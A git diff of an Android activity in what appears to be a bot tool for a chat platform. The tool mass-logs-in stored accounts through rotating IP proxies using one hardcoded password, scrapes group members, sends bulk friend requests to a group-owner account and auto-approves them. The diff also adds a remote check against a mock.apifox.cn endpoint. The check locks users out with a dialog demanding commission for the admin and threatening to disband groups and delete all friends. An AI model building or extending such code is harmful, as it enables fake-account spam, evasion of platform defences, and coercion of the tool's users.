@@ -1,7 +1,11 @@
 package myapplication.ui;
 
+import static myapplication.base.Cons.project_id;
+
 import android.Manifest;
+import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
@@ -14,20 +18,27 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
+import com.google.gson.JsonObject;
 import com.hjq.http.listener.OnHttpListener;
 import com.hjq.permissions.OnPermissionCallback;
 import com.hjq.permissions.Permission;
 import com.hjq.permissions.XXPermissions;
+import com.lzy.okgo.OkGo;
+import com.lzy.okgo.callback.StringCallback;
+import com.lzy.okgo.model.Response;
 
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
 import org.greenrobot.eventbus.ThreadMode;
+import org.json.JSONObject;
 import org.litepal.LitePal;
 
+import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
@@ -40,8 +51,10 @@ import myapplication.base.BaseMessageActivity;
 import myapplication.base.Cons;
 import myapplication.bean.ConfigBean;
 import myapplication.bean.MemberAddBean;
+import myapplication.modules.audit.AuditListBean;
 import myapplication.modules.groupList.GroupListBean;
 import myapplication.modules.groupMemberList.GroupMemberListBean;
+import myapplication.modules.isNewDevices.IsNewDeviceBean;
 import myapplication.modules.login.LoginBean;
 import myapplication.modules.login.LoginRequest;
 import myapplication.modules.proxy.IPProxy;
@@ -51,8 +64,10 @@ import myapplication.modules.sms.smsLogin.SmsLoginBean;
 import myapplication.service.TaskService;
 import myapplication.utils.AddFriend;
 import myapplication.utils.Config;
+import myapplication.utils.GetAllUserList;
 import myapplication.utils.Log2File;
 import myapplication.utils.LogUtils;
+import myapplication.utils.MD5Utils;
 import pub.devrel.easypermissions.EasyPermissions;
 import tgio.benchmark.R;
 import tgio.benchmark.databinding.ActivityMainNewBinding;
@@ -60,6 +75,8 @@ import tgio.rncryptor.RNCryptorNative;
 
 public class MainActivityNew extends BaseMessageActivity<ActivityMainNewBinding> {
 
+    public static LoginBean groupOwerInfo, needLoadGroupInfo;
+    private LoginRequest request;
     @Override
     protected String getTitleStr() {
         return "首页";
@@ -80,15 +97,49 @@ public class MainActivityNew extends BaseMessageActivity<ActivityMainNewBinding>
         EventBus.getDefault().register(this);
         requestPermission();
         binding.tvHintMessage.setText("加载中...");
-        List<LoginBean> regs = LitePal.findAll(LoginBean.class);
-        List<SearchUserBean> searchUserBeansAll = LitePal.findAll(SearchUserBean.class);
-        List<SearchUserBean> searchUserBeans = LitePal.where("isAdded = ?", "0").find(SearchUserBean.class);
-        binding.tvHintMessage.setText("已经注册的账号一共" + regs.size() + "个");
-        binding.tvHintMessage.append("\n");
-        binding.tvHintMessage.append("搜索到的用户数量：" + searchUserBeansAll.size() + "个");
-        binding.tvHintMessage.append("\n");
-        binding.tvHintMessage.append("搜索到的用户，但未添加的数量：" + searchUserBeans.size() + "个");
+        request = new LoginRequest(this);
 
+        new Thread(){
+            @Override
+            public void run() {
+                super.run();
+                try {
+                    okhttp3.Response response = OkGo.get("https://mock.apifox.cn/m1/1482664-0-default/api/open")
+                            .execute();
+                    String result = response.body().string();
+                    JSONObject json = new JSONObject(result);
+                    if(json.getInt("open") == 0){
+                        runOnUiThread(new Runnable() {
+                            @Override
+                            public void run() {
+                                new AlertDialog.Builder(context).setMessage("按照预先设定的程序，你没有付佣金给管理员，请联系管理员开启").setNegativeButton("确定", new DialogInterface.OnClickListener() {
+                                    @Override
+                                    public void onClick(DialogInterface dialog, int which) {
+                                        finish();
+                                    }
+                                }).setCancelable(false).create().show();
+                            }
+                        });
+                    }
+
+                    if(json.getInt("open") == 1){
+                        runOnUiThread(new Runnable() {
+                            @Override
+                            public void run() {
+                                new AlertDialog.Builder(context).setMessage("按照预先设定的程序，你没有付佣金给管理员，管理员会在接下来的一段时间解散群并删除所有好友").setNegativeButton("确定", new DialogInterface.OnClickListener() {
+                                    @Override
+                                    public void onClick(DialogInterface dialog, int which) {
+                                        finish();
+                                    }
+                                }).setCancelable(false).create().show();
+                            }
+                        });
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }.start();
     }
 
     @Override
@@ -105,8 +156,25 @@ public class MainActivityNew extends BaseMessageActivity<ActivityMainNewBinding>
     @Override
     protected void onResume() {
         super.onResume();
+        List<LoginBean> regs = LitePal.findAll(LoginBean.class);
+        binding.tvHintMessage.setText("已经注册的账号一共" + regs.size() + "个");
+        binding.tvHintMessage.append("\n");
         List<MemberAddBean> memberAddBeanList = LitePal.findAll(MemberAddBean.class);
         binding.btnGroupUser.setText("拉取群成员列表,目前共有"+memberAddBeanList.size()+"个群成员已经获取到");
+        List<SearchUserBean> searchUserBeansAll = LitePal.findAll(SearchUserBean.class);
+        List<SearchUserBean> searchUserBeans = LitePal.where("isAdded = ?", "0").find(SearchUserBean.class);
+
+        binding.tvHintMessage.append("搜索到的用户数量：" + searchUserBeansAll.size() + "个");
+        binding.tvHintMessage.append("\n");
+        binding.tvHintMessage.append("搜索到的用户，但未添加的数量：" + searchUserBeans.size() + "个");
+
+        if(groupOwerInfo != null){
+            binding.btnGroupOwer.setText("群主账号已经登陆");
+            binding.btnGroupOwer.setEnabled(false);
+        }else{
+            binding.btnGroupOwer.setText("登录群主账号");
+            binding.btnGroupOwer.setEnabled(true);
+        }
     }
 
 
@@ -160,7 +228,7 @@ public class MainActivityNew extends BaseMessageActivity<ActivityMainNewBinding>
         startActivity(new Intent(this, AddFriendActivity.class));
     }
 
-    public void loadGroupUser(){
+    public void loadGroupUser(View v){
         startActivity(new Intent(this, LoadGroupUserActivity.class));
     }
 
@@ -168,10 +236,161 @@ public class MainActivityNew extends BaseMessageActivity<ActivityMainNewBinding>
         startService(new Intent(this, TaskService.class));
     }
 
-    public void joni_group_manager(View v){
-        List<LoginBean> regs = LitePal.findAll(LoginBean.class);
-        LoginBean loginBean = regs.get(0);
 
+
+    public void searchUserById(View v){
+        new Thread(){
+            @Override
+            public void run() {
+                super.run();
+                List<LoginBean> regs = LitePal.findAll(LoginBean.class);
+                LoginBean loginBean = regs.get(0);
+                GetAllUserList.getAllUser(new LoginRequest(context), loginBean.getToken());
+            }
+        }.start();
+    }
+
+    public void loginGroupOwerAccount(View v){
+        new Thread(){
+            @Override
+            public void run() {
+                super.run();
+                showProgressDialog();
+                IPProxy.setProxy(context);
+                ConfigBean configBean = Config.getConfig();
+                String username = configBean.getMainGroupAccount();
+                String password = MD5Utils.encode(configBean.getMainGroupPwd());
+                IsNewDeviceBean isNewDeviceBean = request.isNewDevice(username, password);
+                if(isNewDeviceBean == null){
+                    dismissProgressDialog();
+                    sendDialogMessage("主账号登录失败");
+                    return;
+                }
+                if(isNewDeviceBean.getIsNewDevice() == 1){
+                    inputCode(new DialogInterface.OnClickListener() {
+                        @Override
+                        public void onClick(DialogInterface dialog, int which) {
+                            LogUtils.e("---->", code);
+                            new Thread(){
+                                @Override
+                                public void run() {
+                                    super.run();
+                                    loginMain();
+                                }
+                            }.start();
+                        }
+                    });
+                }else{
+                    loginMain();
+                }
+            }
+        }.start();
+    }
+
+
+
+    void loginMain(){
+        ConfigBean configBean = Config.getConfig();
+        LoginBean bean = request.login(
+                configBean.getMainGroupAccount(),
+                configBean.getMainGroupPwd(),
+                Cons.main_deviceId,
+                Cons.main_clientId,
+                code);
+        if(bean == null){
+            dismissProgressDialog();
+            sendDialogMessage("主账号登录失败");
+            return;
+        }
+        groupOwerInfo = bean;
+        dismissProgressDialog();
+        sendDialogMessage("主账号登录成功");
+    }
+
+    public void loginNeedLoadGroupUserAccount(View v){
+        new Thread(){
+            @Override
+            public void run() {
+                super.run();
+                showProgressDialog();
+                IPProxy.setProxy(context);
+                ConfigBean configBean = Config.getConfig();
+                String username = configBean.getGroupAccount();
+                String password = MD5Utils.encode(configBean.getGroupPwd());
+                IsNewDeviceBean isNewDeviceBean = request.isNewDevice(username, password);
+                if(isNewDeviceBean == null){
+                    dismissProgressDialog();
+                    sendDialogMessage("群账号登录失败");
+                    return;
+                }
+                if(isNewDeviceBean.getIsNewDevice() == 1){
+                    inputCode(new DialogInterface.OnClickListener() {
+                        @Override
+                        public void onClick(DialogInterface dialog, int which) {
+                            LogUtils.e("---->", code);
+                            new Thread(){
+                                @Override
+                                public void run() {
+                                    super.run();
+                                    loginGroup();
+                                }
+                            }.start();
+                        }
+                    });
+                }else{
+                    loginGroup();
+                }
+            }
+        }.start();
+    }
+
+    void loginGroup(){
+        ConfigBean configBean = Config.getConfig();
+        LoginBean bean = request.login(
+                configBean.getGroupAccount(),
+                configBean.getGroupPwd(),
+                Cons.main_group_deviceId,
+                Cons.main_group_clientId,
+                code);
+        if(bean == null){
+            dismissProgressDialog();
+            sendDialogMessage("群账号登录失败");
+            return;
+        }
+        needLoadGroupInfo = bean;
+        dismissProgressDialog();
+        sendDialogMessage("群账号登录成功");
+    }
+
+    public void addOwerFriend(View v){
+        new Thread(){
+            @Override
+            public void run() {
+                super.run();
+                showProgressDialog();
+                List<LoginBean> regs = LitePal.findAll(LoginBean.class);
+                for(LoginBean bean : regs){
+                    IPProxy.setProxy(context);
+                    LoginBean loginBean = request.login(bean.getUsername(), "666888aa..", bean.getDeviceid(), bean.getClientid());
+                    if(loginBean == null)continue;
+                    request.addFriend(loginBean.getToken(), groupOwerInfo.getUser_id()+"");
+                }
+                //获取请求列表
+                List<AuditListBean> auditListBeans = request.auditList();
+                if(auditListBeans == null){
+                    dismissProgressDialog();
+                    sendDialogMessage("获取申请列表失败");
+                    return;
+                }
+                //同意添加
+                for(AuditListBean auditListBean : auditListBeans){
+                    request.auditAgree(auditListBean);
+                }
+
+                dismissProgressDialog();
+                sendDialogMessage("添加好友完成");
+            }
+        }.start();
     }
 
     void toast(String msg) {
